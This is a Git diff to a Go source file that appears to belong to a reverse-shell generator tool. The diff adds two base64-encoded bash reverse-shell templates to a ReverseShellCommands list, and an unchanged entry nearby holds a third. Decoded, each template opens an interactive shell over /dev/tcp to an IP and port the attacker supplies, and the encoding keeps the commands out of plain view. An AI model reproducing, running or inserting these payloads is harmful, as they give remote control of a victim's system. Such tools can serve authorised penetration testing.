@@ -81,6 +81,16 @@ var ReverseShellCommands = []ReverseShellCommand{
 		[]string{"linux", "mac"},
 	},
 	{
+		"Bash -c double quote",
+		"e3suU2hlbGx9fSAtYyAie3suU2hlbGx9fSAtaSA+JiAvZGV2L3RjcC97ey5JcH19L3t7LlBvcnR9fSAwPiYxIg==",
+		[]string{"linux", "mac"},
+	},
+	{
+		"Bash -c single quote",
+		"e3suU2hlbGx9fSAtYyAne3suU2hlbGx9fSAtaSA+JiAvZGV2L3RjcC97ey5JcH19L3t7LlBvcnR9fSAwPiYxJw==",
+		[]string{"linux", "mac"},
+	},
+	{
 		"Bash 196",
 		"MDwmMTk2O2V4ZWMgMTk2PD4vZGV2L3RjcC97ey5JcH19L3t7LlBvcnR9fTsge3suU2hlbGx9fSA8JjE5NiA+JjE5NiAyPiYxOTY=",
 		[]string{"linux", "mac"},
